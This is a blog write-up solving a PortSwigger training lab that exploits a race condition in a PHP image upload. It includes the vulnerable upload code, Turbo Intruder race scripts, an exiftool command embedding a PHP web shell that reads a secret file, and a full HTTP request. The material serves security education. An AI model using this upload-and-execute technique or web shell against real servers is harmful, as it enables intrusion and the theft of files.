<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="generator" content="Jekyll">
  

  <title>Expert Lab: Web Shell Upload via Race Condition - Diaries of a Modern Ninja</title>

  <link rel="stylesheet" href="/css/main.css">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  
  <link rel="alternate" type="application/rss+xml" title="Diaries of a Modern Ninja" href="https://nima.ninja/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Expert Lab: Web Shell Upload via Race Condition" />
<meta name="author" content="Nima" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Lab Description: This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them." />
<meta property="og:description" content="Lab Description: This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them." />
<link rel="canonical" href="https://nima.ninja/blog/2022/expert-lab-web-shell-upload-via-race-condition" />
<meta property="og:url" content="https://nima.ninja/blog/2022/expert-lab-web-shell-upload-via-race-condition" />
<meta property="og:site_name" content="Diaries of a Modern Ninja" />
<meta property="og:image" content="https://nima.ninja/blog/assets/console.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-09T00:00:00-04:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://nima.ninja/blog/assets/console.png" />
<meta property="twitter:title" content="Expert Lab: Web Shell Upload via Race Condition" />
<meta name="twitter:site" content="@cSh4rk" />
<meta name="twitter:creator" content="@cSh4rk" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nima"},"dateModified":"2022-05-09T00:00:00-04:00","datePublished":"2022-05-09T00:00:00-04:00","description":"Lab Description: This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.","headline":"Expert Lab: Web Shell Upload via Race Condition","image":"https://nima.ninja/blog/assets/console.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://nima.ninja/blog/2022/expert-lab-web-shell-upload-via-race-condition"},"url":"https://nima.ninja/blog/2022/expert-lab-web-shell-upload-via-race-condition"}</script>
<!-- End Jekyll SEO tag -->

</head>


  <body>
    <div id="wrapper">
      <header>
  <div>
    <a href="/">
    
    <h1><!--email_off-->nima@home:~$<!--/email_off--></h1>
    </a>
    <div class="header-links">
      <a href="/about"><h2 class="header-link">About</h2></a>
<a href="/"><h2 class="header-link">All</h2></a>
<a href="/blog/"><h2 class="header-link">Blog</h2></a>
<a href="/books/"><h2 class="header-link">Books</h2></a>
<a href="/links/"><h2 class="header-link">Links</h2></a>
<a href="/tags/"><h2 class="header-link">Tags</h2></a>
<a href="/contact"><h2 class="header-link">Contact</h2></a>
<a href="/kevin-mitnick" class="no-decoration"><h2 class="header-link" title="RIP Kevin Mitnick">ðŸ–¤</h2></a>

<!--<a href="/feed.xml"><h2 class="header-link">RSS</h2></a>-->

    </div>
  </div>
</header>

      <div class="container">
        <section id="main_content">
          <article>
  <h2>Expert Lab: Web Shell Upload via Race Condition</h2>
  <div class="postitem">
    
      <a href="/blog/" class="no-decoration"><code class="language-plaintext highlighter-rouge">blog</code></a>
    
    
      <code class="posttag"><a href="/tags/#web-application-security" class="no-decoration">Web Application Security</a></code>
    
      <code class="posttag"><a href="/tags/#web-security-academy" class="no-decoration">Web Security Academy</a></code>
    
      <code class="posttag"><a href="/tags/#expert-labs" class="no-decoration">Expert Labs</a></code>
    
      <code class="posttag"><a href="/tags/#file-upload-vulnerabilities" class="no-decoration">File Upload Vulnerabilities</a></code>
    
      <code class="posttag"><a href="/tags/#race-condition-vulnerabilities" class="no-decoration">Race Condition Vulnerabilities</a></code>
    
      <code class="posttag"><a href="/tags/#turbo-intruder" class="no-decoration">Turbo Intruder</a></code>
    
      <code class="posttag"><a href="/tags/#exiftool" class="no-decoration">Exiftool</a></code>
    
  </div>
  <span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 3H18V1H16V3H8V1H6V3H5C3.9 3 3 3.89 3 5V19C3 20.11 3.9 21 5 21H19C20.11 21 21 20.11 21 19V5C21 3.89 20.11 3 19 3M19 19H5V9H19V19M19 7H5V5H19M7 11H12V16H7" /></svg></span>
  <time datetime="2022-05-09T00:00:00-04:00" class="by-line"><strong>Published: </strong>09 May 2022</time>
  
  <p><br /></p>
<picture>
  <source srcset="/blog/assets/console.avif" type="image/avif" />
<source srcset="/blog/assets/console.webp" type="image/webp" />
  <img src="/blog/assets/console.png" width="256" height="256" alt="" loading="eager" fetchpriority="high" />
</picture>

<p><sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>
<br /></p>

<h3 id="lab-link">Lab Link</h3>
<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition</a></p>

<p><br /></p>
<h3 id="lab-description">Lab Description</h3>
<hr />
<p><br />
This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.</p>

<p>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.</p>

<p>You can log in to your own account using the following credentials: wiener:peter</p>

<p><br /></p>
<h3 id="lab-hint">Lab Hint</h3>
<hr />
<p><br />
The vulnerable code that introduces this race condition is as follows:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">"avatars/"</span><span class="p">;</span>
<span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"avatar"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>

<span class="c1">// temporary move</span>
<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"avatar"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nf">checkViruses</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nf">checkFileType</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"The file "</span><span class="mf">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span> <span class="nv">$target_file</span><span class="p">)</span><span class="mf">.</span> <span class="s2">" has been uploaded."</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">unlink</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"Sorry, there was an error uploading your file."</span><span class="p">;</span>
    <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">checkViruses</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// checking for viruses</span>
    <span class="mf">...</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">checkFileType</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"jpg"</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"png"</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"Sorry, only JPG &amp; PNG files are allowed</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><br /></p>
<h3 id="solutions">Solutions</h3>
<hr />
<p><br /></p>
<h3 id="solution-1-my-solution">Solution 1: My Solution</h3>
<p>The main logic for me to solve this lab was to upload a suitable sized file(not small not that large) then because of this vulnerable code exposed in hint section, I knew that my PHP file would be on the server for a fraction of a second then the virus and extension check would be done on it then because it is a PHP file and not a JPG or PNG, it would be deleted, so I could use race condition to read the PHP file in a few milliseconds that the file exists on the server before deletion so: I used Burp Turbo Intruder<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> for solving this lab to be able to send GET requests to read the PHP file as fast as I can. A simple code is used in Turbo Intruder for solving this lab:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>

    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>

                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span>

                           <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>

                           <span class="n">pipeline</span><span class="o">=</span><span class="bp">False</span>

                           <span class="p">)</span>

    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">:</span>

        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>

        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>

    <span class="c1"># currently available attributes are req.status, req.wordcount, req.length and req.response
</span>
    <span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">404</span><span class="p">:</span>

        <span class="n">table</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</code></pre></div></div>

<p>I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a random 500KB PNG file from the web and used exiftool to add this code to it and renamed it to a PHP file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool -comment="&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;" diamond.php
</code></pre></div></div>

<p>then because of a line of code in vulnerable code in hint:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
</code></pre></div></div>

<p>I changed the name of the file to the longest to increase the file processing (even for a few milliseconds) for <code class="language-plaintext highlighter-rouge">strtolower</code> function to maximum to save myself some time for race condition:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9LKhNJGiTLcMURUGt9a5WulDgvZwvvGDUlnfmPzaglT7VoZcV0lwo4sXK1emCplNsJsf2LU4Wa1arKxmik9iN0pCb4xBhBJ7Id8Bn2Ay6RhWPd2uHyBhhTnCjU7wgdGJjYNBBptx2ky9k0kWHCqpe09UGryPKiaNFugvgEWHpmAOjXxRY7JpH50hbtmw4uZQ3L0k0W2DpYBvcYvgTsXIW2tGiPdN.php
</code></pre></div></div>

<p>this was the biggest name that windows let me to use. then I made the file upload ready but before that, I started burp turbo intruder with the above code on this request as a NULL payload:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/files/avatars/9LKhNJGiTLcMURUGt9a5WulDgvZwvvGDUlnfmPzaglT7VoZcV0lwo4sXK1emCplNsJsf2LU4Wa1arKxmik9iN0pCb4xBhBJ7Id8Bn2Ay6RhWPd2uHyBhhTnCjU7wgdGJjYNBBptx2ky9k0kWHCqpe09UGryPKiaNFugvgEWHpmAOjXxRY7JpH50hbtmw4uZQ3L0k0W2DpYBvcYvgTsXIW2tGiPdN.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">aca11f781e0864bac09904d8002e00ef.web-security-academy.net</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=vPq6ob4pyKBosm73un9VIH47fzVFKaqo</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">none</span>
<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
<span class="na">Dnt</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Gpc</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</code></pre></div></div>

<p>then I hit upload on the web page in the browser to send the file, and after about one minute I could get some 200 responses in turbo intruder containing password for carlos! :)</p>

<p><br /></p>
<h3 id="solution-2--web-security-academys-solution">Solution 2:  Web Security Academyâ€™s Solution</h3>
<p>The Web Security Academy solved this lab in a better and more precise way that can be used in the future race condition situations without bombarding the server with many requests:</p>

<p>As you can see from the hint source code above, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means itâ€™s possible to execute the file in the small time-window before it is removed.</p>

<p><br /></p>
<h4 id="note">Note</h4>
<p><em>Due to the generous time window for this race condition, it is possible to solve this lab by manually sending two requests in quick succession using Burp Repeater. The solution described here teaches you a practical approach for exploiting similar vulnerabilities in the wild, where the window may only be a few milliseconds.</em></p>

<p><br /></p>

<ol>
  <li>
    <p>Log in and upload an image as your avatar, then go back to your account page.</p>
  </li>
  <li>
    <p>In Burp, go to <strong>Proxy &gt; HTTP history</strong> and notice that your image was fetched using a <code class="language-plaintext highlighter-rouge">GET</code> request to <code class="language-plaintext highlighter-rouge">/files/avatars/&lt;YOUR-IMAGE&gt;</code>.</p>
  </li>
  <li>
    <p>On your system, create a file called <code class="language-plaintext highlighter-rouge">exploit.php</code> containing a script for fetching the contents of Carlosâ€™s secret. For example:</p>
  </li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/home/carlos/secret'</span><span class="p">);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<ol start="4">
  <li>
    <p>Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that arenâ€™t images, even if you try using some of the techniques youâ€™ve learned in previous labs.</p>
  </li>
  <li>
    <p>If you havenâ€™t already, add the Turbo Intruder extension to Burp from the BApp store.</p>
  </li>
  <li>
    <p>Right-click on the <code class="language-plaintext highlighter-rouge">POST /my-account/avatar</code> request that was used to submit the file upload and select <strong>Extensions &gt; Turbo Intruder &gt; Send to turbo intruder</strong>. The Turbo Intruder window opens.</p>
  </li>
  <li>
    <p>Copy and paste the following script template into Turbo Intruderâ€™s Python editor:</p>
  </li>
</ol>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">10</span><span class="p">,)</span>

    <span class="n">request1</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">&lt;YOUR-POST-REQUEST&gt;</span><span class="sh">'''</span>

    <span class="n">request2</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">&lt;YOUR-GET-REQUEST&gt;</span><span class="sh">'''</span>

    <span class="c1"># the 'gate' argument blocks the final byte of each request until openGate is invoked
</span>    <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">request1</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">request2</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>

    <span class="c1"># wait until every 'race1' tagged request is ready
</span>    <span class="c1"># then send the final byte of each request
</span>    <span class="c1"># (this method is non-blocking, just like queue)
</span>    <span class="n">engine</span><span class="p">.</span><span class="nf">openGate</span><span class="p">(</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">engine</span><span class="p">.</span><span class="nf">complete</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
    <span class="n">table</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</code></pre></div></div>

<ol start="8">
  <li>
    <p>In the script, replace <code class="language-plaintext highlighter-rouge">&lt;YOUR-POST-REQUEST&gt;</code> with the entire <code class="language-plaintext highlighter-rouge">POST /my-account/avatar</code> request containing your <code class="language-plaintext highlighter-rouge">exploit.php</code> file. You can copy and paste this from the top of the Turbo Intruder window.</p>
  </li>
  <li>
    <p>Replace <code class="language-plaintext highlighter-rouge">&lt;YOUR-GET-REQUEST&gt;</code> with a <code class="language-plaintext highlighter-rouge">GET</code> request for fetching your uploaded PHP file. The simplest way to do this is to copy the <code class="language-plaintext highlighter-rouge">GET /files/avatars/&lt;YOUR-IMAGE&gt;</code> request from your proxy history, then change the filename in the path to <code class="language-plaintext highlighter-rouge">exploit.php</code>.</p>
  </li>
  <li>
    <p>At the bottom of the Turbo Intruder window, click <strong>Attack</strong>. This script will submit a single <code class="language-plaintext highlighter-rouge">POST</code> request to upload your <code class="language-plaintext highlighter-rouge">exploit.php</code> file, instantly followed by 5 <code class="language-plaintext highlighter-rouge">GET</code> requests to <code class="language-plaintext highlighter-rouge">/files/avatars/exploit.php</code>.</p>
  </li>
  <li>
    <p>In the results list, notice that some of the <code class="language-plaintext highlighter-rouge">GET</code> requests received a 200 response containing Carlosâ€™s secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.</p>
  </li>
  <li>
    <p>Submit the secret to solve the lab.</p>
  </li>
</ol>

<p><br /></p>
<h4 id="note-1">Note</h4>
<p><em>If you choose to build the <code class="language-plaintext highlighter-rouge">GET</code> request manually, make sure you terminate it properly with a <code class="language-plaintext highlighter-rouge">\r\n\r\n</code> sequence. Also remember that Python will preserve any whitespace within a multiline string, so you need to adjust your indentation accordingly to ensure that a valid request is sent.</em></p>

<p><br /></p>
<h3 id="my-comment">My Comment</h3>
<hr />
<ol>
  <li>
    <p>Use Burp Turbo Intruder for race condition tests.</p>
  </li>
  <li>
    <p>Thereâ€™s always a risk for race condition and then remote code execution if the file upload mechanism uploads files on the server then validates them even if the file stays on the server for only a fraction of a second.</p>
  </li>
</ol>

<p><br /></p>
<h3 id="external-links"><em>External Links</em></h3>
<hr />
<ul>
  <li>
    <h4 id="lab-web-shell-upload-via-race-condition"><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition</a></h4>
  </li>
</ul>

<p><br /></p>
<h3 id="references"><em>References</em></h3>
<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Icon made by <a href="https://www.flaticon.com/authors/freepik">Freepik</a> from <a href="https://www.flaticon.com/">www.flaticon.com</a>Â <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p><a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">Turbo Intruder</a>Â <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

</article>

        </section>
      </div>
    </div>

     
  
    <footer class="site-footer">
  <div class="row">
    <div class="footer-wrapper">
      <div class="footer-col-social col-5 col-s-4">
        <ul>
  
    <li class="social-media-list">
      <a title="GitHub Profile" href="https://github.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="X Profile" href="https://x.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="24px" height="24px" clip-rule="evenodd" baseProfile="basic"><polygon fill="#616161" points="41,6 9.929,42 6.215,42 37.287,6"/><polygon fill="#fff" fill-rule="evenodd" points="31.143,41 7.82,7 16.777,7 40.1,41" clip-rule="evenodd"/><path fill="#616161" d="M15.724,9l20.578,30h-4.106L11.618,9H15.724 M17.304,6H5.922l24.694,36h11.382L17.304,6L17.304,6z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a rel="me" title="Mastodon Profile" href="https://infosec.exchange/@cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.327 8.566c0-4.339-2.843-5.61-2.843-5.61-1.433-.658-3.894-.935-6.451-.956h-.063c-2.557.021-5.016.298-6.45.956 0 0-2.843 1.272-2.843 5.61 0 .993-.019 2.181.012 3.441.103 4.243.778 8.425 4.701 9.463 1.809.479 3.362.579 4.612.51 2.268-.126 3.541-.809 3.541-.809l-.075-1.646s-1.621.511-3.441.449c-1.804-.062-3.707-.194-3.999-2.409a4.523 4.523 0 0 1-.04-.621s1.77.433 4.014.536c1.372.063 2.658-.08 3.965-.236 2.506-.299 4.688-1.843 4.962-3.254.434-2.223.398-5.424.398-5.424zm-3.353 5.59h-2.081V9.057c0-1.075-.452-1.62-1.357-1.62-1 0-1.501.647-1.501 1.927v2.791h-2.069V9.364c0-1.28-.501-1.927-1.502-1.927-.905 0-1.357.546-1.357 1.62v5.099H6.026V8.903c0-1.074.273-1.927.823-2.558.566-.631 1.307-.955 2.228-.955 1.065 0 1.872.409 2.405 1.228l.518.869.519-.869c.533-.819 1.34-1.228 2.405-1.228.92 0 1.662.324 2.228.955.549.631.822 1.484.822 2.558v5.253z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  


  
    <li class="social-media-list">
      <a title="Discord Server" href="https://discord.gg/4btHxXWwgQ"><span class="icon"><?xml version="1.0" ?><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title/><path d="M20.222 0c1.406 0 2.54 1.137 2.607 2.475V24l-2.677-2.273-1.47-1.338-1.604-1.398.67 2.205H3.71c-1.402 0-2.54-1.065-2.54-2.476V2.48C1.17 1.142 2.31.003 3.715.003h16.5L20.222 0zm-6.118 5.683h-.03l-.202.2c2.073.6 3.076 1.537 3.076 1.537-1.336-.668-2.54-1.002-3.744-1.137-.87-.135-1.74-.064-2.475 0h-.2c-.47 0-1.47.2-2.81.735-.467.203-.735.336-.735.336s1.002-1.002 3.21-1.537l-.135-.135s-1.672-.064-3.477 1.27c0 0-1.805 3.144-1.805 7.02 0 0 1 1.74 3.743 1.806 0 0 .4-.533.805-1.002-1.54-.468-2.14-1.404-2.14-1.404s.134.066.335.2h.06c.03 0 .044.015.06.03v.006c.016.016.03.03.06.03.33.136.66.27.93.4.466.202 1.065.403 1.8.536.93.135 1.996.2 3.21 0 .6-.135 1.2-.267 1.8-.535.39-.2.87-.4 1.397-.737 0 0-.6.936-2.205 1.404.33.466.795 1 .795 1 2.744-.06 3.81-1.8 3.87-1.726 0-3.87-1.815-7.02-1.815-7.02-1.635-1.214-3.165-1.26-3.435-1.26l.056-.02zm.168 4.413c.703 0 1.27.6 1.27 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334.002-.74.573-1.338 1.27-1.338zm-4.543 0c.7 0 1.266.6 1.266 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334 0-.74.57-1.338 1.27-1.338z"/></svg>
</span><span>Sharks</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="PGP Key" href="/assets/CEE9A66A2F5C6187E4242B0425669795B037FEF2.asc.txt"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.451 17.337l-2.451 2.663h-2v2h-2v2h-6v-5l6.865-6.949c1.08 2.424 3.095 4.336 5.586 5.286zm11.549-9.337c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-3-3c0-1.104-.896-2-2-2s-2 .896-2 2 .896 2 2 2 2-.896 2-2z"/></svg>
</span><span>pgp key</span></a>
    </li>
  

  <li class="social-media-list">
    <a title="RSS Feed" href="/feed.xml"><span class="icon-nofill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#ee802f" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"/></svg>
</span><span>rss</span></a>
  </li>
</ul>

      </div>
      <div class="footer-col-badges col-3 col-s-5">
        <ul>
  
    <li class="social-media-list">
      <!-- Self-hosting HTB badge image for now to increase the viewer's privacy by not using bot protection cookie -->
      <a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/768488"><picture>
  <source srcset="/assets/768488.avif" type="image/avif">
<source srcset="/assets/768488.webp" type="image/webp">
  <img src="/assets/768488.png" width="220" height="50" alt="Hack The Box Profile" loading="lazy" decoding="async" class="no-responsive">
</picture>
</a>
      <!--<a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/768488"><img src="https://www.hackthebox.eu/badge/image/768488" width="220" height="50" loading="lazy" decoding="async" alt="Hack The Box" class="no-responsive"></a>-->
    </li>
  

  
    <li class="social-media-list">
      <a title="TryHackMe Profile" href="https://tryhackme.com/p/nima"><img src="https://tryhackme-badges.s3.amazonaws.com/nima.png" width="329" height="88" loading="lazy" decoding="async" alt="TryHackMe Profile" class="no-responsive" ></a>
    </li>
  
</ul>


      </div>
      <div class="footer-col-copyright col-10 col-s-10 tiny-footer">
        <span>
